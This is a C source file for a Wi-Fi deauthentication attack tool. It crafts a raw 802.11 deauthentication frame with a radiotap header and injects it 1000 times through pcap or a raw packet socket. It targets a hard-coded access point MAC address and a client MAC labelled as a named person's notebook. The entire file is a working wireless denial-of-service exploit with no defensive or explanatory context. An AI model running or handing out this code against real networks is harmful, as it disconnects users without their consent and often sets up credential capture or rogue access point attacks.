#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <assert.h>
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <errno.h>

#pragma pack(1)

#define DEAUTH_REQ \
    "\x00\x00\x0b\x00\x04\x0c\x00\x00\x6c\x0c\x00" \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
#define DISASSO_REQ \
    "\x00\x00\x0b\x00\x04\x0c\x00\x00\x6c\x0c\x00" \
    "\xA0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x08\x00"

static const uint8_t radiotap[] = {
    0x00, 0x00, // <-- radiotap version
    0x0b, 0x00, // <- radiotap header length
    0x04, 0x0c, 0x00, 0x00, // <-- bitmap
    0x6c, // <-- rate
    0x0c, //<-- tx power
    0x00 //<-- antenna
};

struct mgmt_header {
	u_int16_t	fc;
	u_int16_t 	duration;
	u_int8_t	da[6];
	u_int8_t	sa[6];
	u_int8_t	bssid[6]; 
	u_int16_t	seq_ctrl;  // 12bit(sequence number)  + 4bit(fragmented number)
};

int main(int argc, char **argv)
{
    if(argc != 2) {
	printf("usage: %s dev\n", argv[0]);
	exit(EXIT_SUCCESS);
    }

    int i = 0;
    int chans[] = {2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452, 2457,
	2462};	// channel hopping seq: 1 ~ 11

    // init fd
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    static struct ifreq ifr;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
    if(ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
	perror("ioctl(SIOCGIFINDEX");
	exit(EXIT_FAILURE);
    }
    static struct sockaddr_ll sll;
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    if(bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
	perror("bind");
	exit(EXIT_FAILURE);
    }
    static struct iwreq iwr;
    strncpy(iwr.ifr_name, argv[1], IFNAMSIZ);
    iwr.u.freq.e = 6;

#if 0
    // nonblock mode injection
    int flag = fcntl(fd, F_GETFL, 0);
    if(fcntl(fd, F_SETFL, flag | O_NONBLOCK) < 0) {
	perror("fcntl O_NONBLOCK");
	exit(EXIT_FAILURE);
    }
#endif

    // frame content
    static uint8_t buf[] = DEAUTH_REQ;

#ifndef RAW
    // init pcap
    pcap_t *pd = pcap_create(argv[1], NULL);
    pcap_activate(pd);
    assert(pd != NULL);
#endif

    char *ap = "\x22\x22\x22\x22\x22\x22";	// SecLife
    char *sta = "\x88\x9f\xfa\x71\xf1\x39";	// ssson's NoteBook

    // set addresses
    memcpy(buf + sizeof(radiotap) + offsetof(struct mgmt_header, sa),
	sta, 6);
    memcpy(buf + sizeof(radiotap) + offsetof(struct mgmt_header, da),
	ap, 6);
    memcpy(buf + sizeof(radiotap) + offsetof(struct mgmt_header, bssid),
	ap, 6);

    int count = 1000;
    while(count--) {
#if 0
	// change channel
	iwr.u.freq.m = chans[i++ % (sizeof(chans) >> 2)];
	iwr.u.freq.e = 6;
	if(ioctl(fd, SIOCSIWFREQ, &iwr) < 0) {
	    perror("ioctl set");
	}
#endif

	usleep(1);	// MANDATORY!

	// inject j times
	int j = 1;
	while(j--) {
#ifndef RAW
	    if(pcap_inject(pd, buf, sizeof(buf) - 1) < 0) {
		printf("[%d]", errno);
		perror("inject pcap");
	    }
#else
	    if(write(fd, buf, sizeof(buf) - 1) < 0) {
		printf("[%d]", errno);
		fflush(stdout);
		perror("inject!");
	    }
	    if(errno != 0) {
		printf("errno: %d\n", errno);
	    }
#endif
	}

	usleep(30000);
    }

    close(fd);

    return 0;
}
